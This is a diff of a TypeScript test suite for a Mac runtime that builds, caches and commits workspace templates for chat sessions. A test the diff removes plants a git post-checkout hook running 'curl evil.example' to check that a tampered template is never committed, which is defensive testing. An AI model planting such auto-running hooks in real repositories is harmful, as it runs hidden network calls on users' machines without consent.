@@ -178,7 +178,18 @@ const unreachable = async (): Promise<never> => {
   throw new Error("this test configures no Namespace artifacts");
 };
 
-async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<string>) {
+/** Starts a service for the chat; a builder must not run it. Ignored by git, so `clean` keeps it. */
+const BACKGROUND = "echo ran > background.bin";
+
+async function setup(
+  options: {
+    readonly lifetimeMs?: number;
+    readonly derivedHomePaths?: ReadonlyArray<string>;
+    /** Prepare commands a builder runs instead of the chat's, as a `background` marker freezes. */
+    readonly buildPrepareCommands?: (chatCommands: ReadonlyArray<string>) => ReadonlyArray<string>;
+  } = {},
+) {
+  const { lifetimeMs, derivedHomePaths } = options;
   const w = await makeWorld(cleanups);
   const namespace = fakeNamespace(w, lifetimeMs);
   const storage = await fakeArtifacts();
@@ -201,8 +212,12 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
     instances: namespace.instances,
     artifacts: storage.artifacts,
     toolInstall: "true",
+    // The world holds one Mac at a time, so builds run when a test frees it.
+    startBuild: (build) => void builds.push(build),
   });
+  const builds: Array<() => Promise<void>> = [];
   const prepared = await w.prepareInput(chatId, w.head());
+  const prepareCommands = [...(prepared.prepareCommands ?? []), BACKGROUND];
   const manifest = decodeManifest({
     input: {
       requestId: chatId,
@@ -235,7 +250,7 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
       port: await freePort(),
       readinessTimeoutSeconds: 10,
       brokerTtl: "1h",
-      prepareCommands: prepared.prepareCommands,
+      prepareCommands,
       files: prepared.files,
     },
     localArtifact: {
@@ -247,6 +262,9 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
     },
     egressAllow: [],
     ...(derivedHomePaths ? { derivedHomePaths } : {}),
+    buildPrepareCommands: (options.buildPrepareCommands ?? ((commands) => commands.slice(0, -1)))(
+      prepareCommands,
+    ),
   });
   const operation = (environmentId: string, retentionDeadline?: string) =>
     decodeOperation({
@@ -275,6 +293,11 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
   return {
     w,
     namespace,
+    /** Template builds the runtime asked for and has not run yet. */
+    builds,
+    runBuilds: async () => {
+      for (const build of builds.splice(0)) await build();
+    },
     storage,
     runtime,
     manifest,
@@ -290,10 +313,12 @@ async function setup(lifetimeMs?: number, derivedHomePaths?: ReadonlyArray<strin
 }
 
 describe("Namespace Mac runtime", () => {
-  it("fills the cache on a miss, saves while it works, releases, and resumes elsewhere with its work", async () => {
+  it("asks for one build on a miss, saves while it works, releases, and resumes elsewhere with its work", async () => {
     const t = await setup();
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
-    expect(await t.record()).toMatchObject({ kind: "live", mac: { cache: "sealed" } });
+    expect(await t.record()).toMatchObject({ kind: "live", mac: { cache: "ready" } });
+    expect(t.builds, "a miss asks for a build").toHaveLength(1);
+    expect(await t.read("background.bin"), "a chat runs its background commands").toBe("ran\n");
     const op = t.operation(ready.environmentId);
     const attached = await t.runtime.attach(op, t.manifest);
     expect(attached.pairingUrl).toBe(
@@ -316,10 +341,7 @@ describe("Namespace Mac runtime", () => {
 
     const resumed = await t.runtime.resume(op, t.manifest, attached.namespaceProxy);
     expect(resumed.namespaceProxy).toEqual(attached.namespaceProxy);
-    expect(await t.record(), "a restored chat only reads the cache").toMatchObject({
-      kind: "live",
-      mac: { cache: "reader" },
-    });
+    expect(t.builds, "another miss joins the build in flight").toHaveLength(1);
     expect(await t.read("agent.txt")).toBe("first turn\n");
     expect(await t.runtime.touch(op)).toBe("running");
 
@@ -337,38 +359,73 @@ describe("Namespace Mac runtime", () => {
 
     await t.runtime.dispose(op, t.manifest);
     expect([t.namespace.live(), t.storage.live(), await t.record()]).toEqual([[], [], null]);
-    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["commit", "abandon"]);
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "abandon",
+    ]);
+    expect(t.w.committedVolume(), "a chat's Mac never commits").toBeNull();
   });
 
-  it("commits a filler's volume holding only its sealed template, and abandons one whose template changed", async () => {
+  it("builds a template without the chat's background commands, which the next chat adopts", async () => {
     const t = await setup();
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
-    expect(await t.runtime.release(t.operation(ready.environmentId), t.manifest)).toBe("released");
+    const op = t.operation(ready.environmentId);
+    await t.write("agent.txt", "first turn\n");
+    expect(await t.runtime.release(op, t.manifest)).toBe("released");
+    await t.runBuilds();
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon", "commit"]);
     const committed = t.w.committedVolume();
     if (committed === null) throw new Error("expected a committed volume");
-    expect((await NodeFSP.readdir(committed)).toSorted(), "no chat root reaches the cache").toEqual(
-      ["cache.lock", `t3-runtime-${t.w.runtimeSha256}.tar`, "template", "template.json"],
+    expect((await NodeFSP.readdir(committed)).toSorted(), "no root reaches the cache").toEqual([
+      "cache.lock",
+      `t3-runtime-${t.w.runtimeSha256}.tar`,
+      "template",
+      "template.json",
+    ]);
+    const template = NodePath.join(committed, "template", "workspace.partial");
+    expect(await NodeFSP.readdir(template), "the builder ran no background command").not.toContain(
+      "background.bin",
+    );
+    expect(await NodeFSP.readdir(NodePath.join(template, "node_modules"))).toContain(
+      ".installed-at",
     );
 
-    const tampered = await setup();
-    const opened = await tampered.runtime.prepare(tampered.operation("pending"), tampered.manifest);
-    await NodeFSP.writeFile(
-      NodePath.join(
-        tampered.w.mount,
-        "template",
-        "workspace.partial",
-        ".git",
-        "hooks",
-        "post-checkout",
-      ),
-      "#!/bin/sh\ncurl evil.example\n",
-      { mode: 0o755 },
+    await t.runtime.resume(op, t.manifest);
+    expect(t.builds, "a hit asks for no build").toEqual([]);
+    expect(await t.read("agent.txt")).toBe("first turn\n");
+    expect(await t.read("background.bin")).toBe("ran\n");
+    expect(await t.runtime.release(op, t.manifest)).toBe("released");
+    expect(t.w.committedVolume(), "the chat that adopted it leaves the cache as it was").toBe(
+      committed,
     );
-    expect(
-      await tampered.runtime.release(tampered.operation(opened.environmentId), tampered.manifest),
-    ).toBe("released");
-    expect(tampered.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
-    expect(tampered.w.committedVolume(), "a changed template is never committed").toBeNull();
+  });
+
+  it("leaves a current template alone and never commits a build that failed", async () => {
+    const failing = await setup({ buildPrepareCommands: () => ["exit 3"] });
+    const opened = await failing.runtime.prepare(failing.operation("pending"), failing.manifest);
+    await failing.runtime.release(failing.operation(opened.environmentId), failing.manifest);
+    await failing.runBuilds();
+    expect(failing.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "abandon",
+    ]);
+    expect(failing.w.committedVolume()).toBeNull();
+
+    const t = await setup();
+    const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
+    await t.runtime.release(t.operation(ready.environmentId), t.manifest);
+    const [build] = t.builds;
+    if (build === undefined) throw new Error("expected a requested build");
+    await build();
+    const committed = t.w.committedVolume();
+    // The same build again, as when a second manager or a later miss lands on a filled site.
+    await build();
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual([
+      "abandon",
+      "commit",
+      "abandon",
+    ]);
+    expect(t.w.committedVolume()).toBe(committed);
   });
 
   it("keeps a snapshot only as long as its lease's retention, and resumes an expired one as missing", async () => {
@@ -391,7 +448,7 @@ describe("Namespace Mac runtime", () => {
   });
 
   it("leaves a repository's derived home paths out of its snapshots", async () => {
-    const t = await setup(undefined, [".claude"]);
+    const t = await setup({ derivedHomePaths: [".claude"] });
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
     expect(await t.runtime.release(t.operation(ready.environmentId), t.manifest)).toBe("released");
     const bytes = t.storage.bytesOf((await t.record())?.snapshot?.artifactPath ?? "");
@@ -432,7 +489,7 @@ describe("Namespace Mac runtime", () => {
       snapshot: released.snapshot,
       mac: {
         incarnation: { ...before.mac.incarnation, instanceId: InstanceId.make("mac-new") },
-        cache: "reader",
+        cache: "ready",
       },
     };
     await t.overwrite({ ...before, snapshot: released.snapshot });
@@ -457,7 +514,7 @@ describe("Namespace Mac runtime", () => {
   });
 
   it("releases a Mac near its deadline once its chat is idle, and refuses a missing snapshot", async () => {
-    const t = await setup(20 * MINUTE);
+    const t = await setup({ lifetimeMs: 20 * MINUTE });
     const ready = await t.runtime.prepare(t.operation("pending"), t.manifest);
     const op = t.operation(ready.environmentId);
     await t.write("agent.txt", "work\n");
@@ -465,6 +522,6 @@ describe("Namespace Mac runtime", () => {
     expect(await t.runtime.upkeep(op, t.manifest, async () => false)).toBe("released");
     expect(t.namespace.live()).toEqual([]);
     expect(await t.runtime.touch(op)).toBe("released");
-    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["commit"]);
+    expect(t.namespace.departures.map(({ departure }) => departure)).toEqual(["abandon"]);
   });
 });
